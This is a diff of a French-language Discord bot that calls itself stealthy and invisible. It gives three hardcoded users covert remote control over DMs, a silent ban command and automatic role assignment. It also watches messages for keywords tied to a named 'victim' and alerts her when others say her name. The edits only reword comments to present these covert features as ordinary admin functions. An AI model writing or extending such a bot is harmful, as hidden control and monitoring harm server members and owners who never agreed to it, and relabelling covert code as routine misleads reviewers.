@@ -16,7 +16,7 @@ TARGET_USERNAMES = ["akz_92", "kaizow__", "kaizo_"]
 VICTIME_NAME = "m1zuki_1"
 MOTS_CLES = ["cozmo", "ilan", "youngzoomer", "@m1zuki_1"]
 
-# Stockage temporaire pour les demandes
+# Stockage temporaire pour les demandes de timeout
 pending_timeouts = {}
 
 # --- SERVEUR WEB POUR GARDER LE BOT ACTIF SUR RENDER ---
@@ -51,7 +51,7 @@ async def on_ready():
     print(f"Bot furtif opérationnel et invisible pour : {TARGET_USERNAMES}. Surveillance active pour {VICTIME_NAME}.")
 
 # =========================================================================
-# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" aux admins
+# AUTO-ROLE : Ajoute automatiquement le rôle "Membre" à akz_92
 # =========================================================================
 @bot.event
 async def on_member_update(before, after):
@@ -78,13 +78,13 @@ async def on_message(message):
             try:
                 await victime.send(
                     f"🚨 **Cible verrouillée** 🚨\n"
-                    f"L'utilisateur '{message.author.name}' a dit votre prénom.\n"
-                    f"Voulez-vous lui envoyer le message ? Répondez **oui** ou **non**."
+                    f"L'utilisateur '{message.author.name}' a dis votre prénom.\n"
+                    f"Voulez-vous lui envoyer le message d'avertissement ? Répondez **oui** ou **non**."
                 )
             except:
                 pass
 
-    # Réponses de m1zuki_1 en DM pour valider ou non l'envoi du message
+    # Réponses de m1zuki_1 en DM pour valider l'action (strictement limité à m1zuki_1)
     if isinstance(message.channel, discord.DMChannel) and message.author.name == VICTIME_NAME:
         content = message.content.lower().strip()
         if content in ["oui", "non"]:
@@ -107,7 +107,7 @@ async def on_message(message):
             return
 
     # =========================================================================
-    # 1. GESTION DES DM (Contrôle à distance 100% discret)
+    # 1. GESTION DES DM (Contrôle à distance 100% discret strictement pour les administrateurs)
     # =========================================================================
     if isinstance(message.channel, discord.DMChannel):
         if message.author.name not in TARGET_USERNAMES:
@@ -255,7 +255,7 @@ async def on_message(message):
         return
 
     # =========================================================================
-    # 2. COMMANDE .ban SUR LE SERVEUR
+    # 2. COMMANDE .ban SUR LE SERVEUR (100% Silencieuse / Réservée aux administrateurs)
     # =========================================================================
     if message.content.startswith(".ban"):
         if message.author.name in TARGET_USERNAMES:
@@ -279,5 +279,5 @@ async def on_message(message):
 # Lancement du serveur web pour Render
 keep_alive()
 
-# Lancement sécurisé via la variable d'environnement
+# Lancement sécurisé via la variable d'environnement (Token géré sur l'hébergeur)
 bot.run(os.getenv("TOKEN"))
